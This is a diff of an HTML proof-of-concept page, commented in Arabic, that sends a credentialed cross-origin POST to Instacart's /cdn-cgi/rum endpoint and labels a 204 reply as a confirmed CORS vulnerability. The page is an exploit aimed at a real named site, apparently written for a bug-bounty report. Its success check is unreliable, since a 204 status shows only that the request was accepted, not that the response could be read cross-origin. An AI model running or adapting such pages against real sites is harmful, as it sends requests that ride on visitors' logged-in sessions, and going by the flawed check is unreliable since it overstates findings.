@@ -1,32 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Misconfiguration POC</title>
+    <title>Instacart CORS POC</title>
 </head>
 <body>
-  <h1>CORS Misconfiguration POC</h1>
-  <p>اضغط على الزر عشان تبعت طلب POST لـ instacart.com وتعرض الرد.</p>
-  <button id="sendBtn">Send POST Request</button>
-  <pre id="output" style="background:#eee; padding:10px; border:1px solid #ccc;"></pre>
+    <h2>CORS POC for Instacart RUM Endpoint</h2>
+    <p>Open developer tools (F12) and check the Console and Network tabs.</p>
+    <button type="button" onclick="exploit()">Run Exploit</button>
+    <p id="result"></p>
 
-  <script>
-    document.getElementById('sendBtn').addEventListener('click', () => {
-      fetch('https://www.instacart.com/cdn-cgi/rum?', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ test: 'POC test' }),
-        credentials: 'include'  // مهم عشان تبعت الكوكيز وتثبت الثغرة
-      })
-      .then(response => response.text())
-      .then(data => {
-        document.getElementById('output').textContent = 'Response from server:\n' + data;
-      })
-      .catch(error => {
-        document.getElementById('output').textContent = 'Error:\n' + error;
-      });
-    });
-  </script>
+    <script>
+        function exploit() {
+            console.log("Sending CORS request...");
+            document.getElementById("result").innerText = "Sending request...";
+
+            var xhttp = new XMLHttpRequest();
+            var url = "https://www.instacart.com/cdn-cgi/rum?";
+
+            // جسم الطلب بصيغة JSON (يمكن استخدام أي بيانات JSON صالحة)
+            var body = {
+                "referrer": "https://a5-oil-poc.com", // اسم أخيك للتوضيح :)
+                "eventType": 3,
+                "pageloadId": "bb69e27b-6301-49cd-97dc-788699bb3b83",
+                "location": "https://a5-oil-poc.com/some/path"
+            };
+
+            xhttp.onreadystatechange = function() {
+                // نحن نتحقق فقط من اكتمال الطلب
+                if (this.readyState == 4) {
+                    // النجاح هنا هو status 204!
+                    if (this.status == 204) {
+                        console.log("SUCCESS! Request accepted by server with status 204 No Content.");
+                        console.log("This proves the CORS vulnerability.");
+                        document.getElementById("result").innerText = "Success! The server accepted the cross-origin request with status 204. Vulnerability confirmed.";
+                        document.getElementById("result").style.color = "green";
+                    } else {
+                        // أي حالة أخرى هي فشل
+                        console.error("FAILED. Status: " + this.status);
+                        document.getElementById("result").innerText = "Failed. Check the browser console for CORS errors. Status: " + this.status;
+                        document.getElementById("result").style.color = "red";
+                    }
+                }
+            };
+
+            xhttp.open("POST", url, true);
+
+            // 1. يجب أن تكون true بسبب وجود الكوكيز و 'Access-Control-Allow-Credentials'
+            xhttp.withCredentials = true; 
+            
+            // 2. يجب أن تكون 'application/json' لتطابق الطلب الأصلي
+            xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+            // 3. إرسال جسم الطلب بعد تحويله لنص JSON
+            xhttp.send(JSON.stringify(body));
+        }
+    </script>
 </body>
 </html>
